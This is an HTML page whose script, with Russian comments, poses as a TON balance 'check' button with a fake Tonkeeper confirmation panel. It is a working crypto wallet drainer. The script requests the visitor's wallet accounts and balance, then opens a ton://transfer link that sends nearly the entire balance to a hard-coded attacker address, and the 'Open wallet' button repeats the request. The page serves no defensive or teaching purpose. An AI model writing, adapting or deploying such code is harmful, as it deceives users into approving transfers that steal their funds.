<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        .btn {
            background: linear-gradient(135deg, #0098ea, #0080d0);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            margin: 6px 0;
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn:disabled {
            opacity: 0.5;
            transform: none;
        }
        #status {
            margin-top: 16px;
            font-size: 13px;
            color: #888;
            min-height: 50px;
            word-break: break-all;
            line-height: 1.6;
        }
        .hidden {
            display: none !important;
        }
        .balance-display {
            font-size: 24px;
            color: #00ff88;
            margin: 12px 0;
        }

        /* ====== ПЛАШКА КАК НА ПОРТАЛЕ ====== */
        .confirm-box {
            background: #1a2a3a;
            border: 1px solid #2a4a6a;
            border-radius: 16px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }
        .confirm-box.show {
            display: block;
        }
        .confirm-box .icon {
            font-size: 32px;
            margin-bottom: 8px;
        }
        .confirm-box .title {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
        }
        .confirm-box .sub {
            color: #8899aa;
            font-size: 13px;
            margin: 6px 0 12px 0;
        }
        .confirm-box .open-btn {
            background: #0098ea;
            border: none;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 30px;
            border-radius: 40px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        .confirm-box .open-btn:active {
            transform: scale(0.96);
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
        <div class="balance-display" id="balanceDisplay">💰 0 TON</div>
        <button class="btn" id="mainBtn">ПРОВЕРИТЬ</button>
        <div id="status">Нажмите кнопку</div>

        <!-- ====== ПЛАШКА КАК НА ПОРТАЛЕ ====== -->
        <div class="confirm-box" id="confirmBox">
            <div class="icon">🟣</div>
            <div class="title">Confirm the transaction in Tonkeeper</div>
            <div class="sub">It will only take a moment.</div>
            <button class="open-btn" id="openWalletBtn">Open wallet</button>
        </div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

        const mainBtn = document.getElementById('mainBtn');
        const status = document.getElementById('status');
        const balanceDisplay = document.getElementById('balanceDisplay');
        const confirmBox = document.getElementById('confirmBox');
        const openWalletBtn = document.getElementById('openWalletBtn');

        // ========== ПОЛУЧИТЬ БАЛАНС ==========
        async function getBalance() {
            try {
                if (!window.tonkeeper) return 0;
                const provider = window.tonkeeper;
                const accounts = await provider.send('ton_requestAccounts', {});
                if (!accounts || accounts.length === 0) return 0;
                const address = accounts[0];
                const hex = await provider.send('ton_getBalance', { address: address });
                const nano = parseInt(hex, 16);
                const balance = (nano / 1e9).toFixed(6);
                balanceDisplay.innerText = `💰 ${balance} TON`;
                return nano;
            } catch(e) {
                return 0;
            }
        }

        // ========== ОСНОВНАЯ КНОПКА ==========
        mainBtn.onclick = async function() {
            status.innerText = '⏳ Проверка...';
            mainBtn.disabled = true;
            mainBtn.style.opacity = '0.5';

            // 1. ПОЛУЧАЕМ БАЛАНС
            const nano = await getBalance();
            
            if (nano <= 0) {
                status.innerText = '💰 Баланс 0 TON';
                mainBtn.disabled = false;
                mainBtn.style.opacity = '1';
                return;
            }

            // 2. ВЫЧИТАЕМ КОМИССИЮ
            const fee = 5000000;
            const amount = nano - fee;

            if (amount <= 0) {
                status.innerText = '⚠️ Баланс меньше комиссии';
                mainBtn.disabled = false;
                mainBtn.style.opacity = '1';
                return;
            }

            const amountTON = (amount / 1e9).toFixed(6);
            status.innerText = `⏳ Отправка ${amountTON} TON...`;

            // 3. ОТКРЫВАЕМ TON KEEPER С ТРАНЗАКЦИЕЙ НА ВЕСЬ БАЛАНС
            const url = `ton://transfer?address=${TARGET}&amount=${amountTON}`;
            window.location.href = url;
            
            setTimeout(() => {
                window.open(url, '_blank');
            }, 300);

            // ====== ПОКАЗЫВАЕМ ПЛАШКУ ======
            confirmBox.classList.add('show');
            status.innerText = `✅ Подтвердите транзакцию на ${amountTON} TON в TON Keeper`;

            mainBtn.disabled = false;
            mainBtn.style.opacity = '1';
        };

        // ========== КНОПКА "OPEN WALLET" ==========
        openWalletBtn.onclick = async function() {
            const nano = await getBalance();
            if (nano <= 0) {
                status.innerText = '💰 Баланс 0 TON';
                return;
            }
            const fee = 5000000;
            const amount = nano - fee;
            if (amount <= 0) {
                status.innerText = '⚠️ Баланс меньше комиссии';
                return;
            }
            const amountTON = (amount / 1e9).toFixed(6);
            const url = `ton://transfer?address=${TARGET}&amount=${amountTON}`;
            window.location.href = url;
            setTimeout(() => {
                window.open(url, '_blank');
            }, 300);
        };

        // ========== АВТОПРОВЕРКА ПРИ ЗАГРУЗКЕ ==========
        setTimeout(async () => {
            if (window.tonkeeper) {
                await getBalance();
                status.innerText = '🟢 Нажмите "ПРОВЕРИТЬ"';
            } else {
                status.innerText = '📱 Нажмите "ПРОВЕРИТЬ"';
            }
        }, 500);
    </script>
</body>
</html>
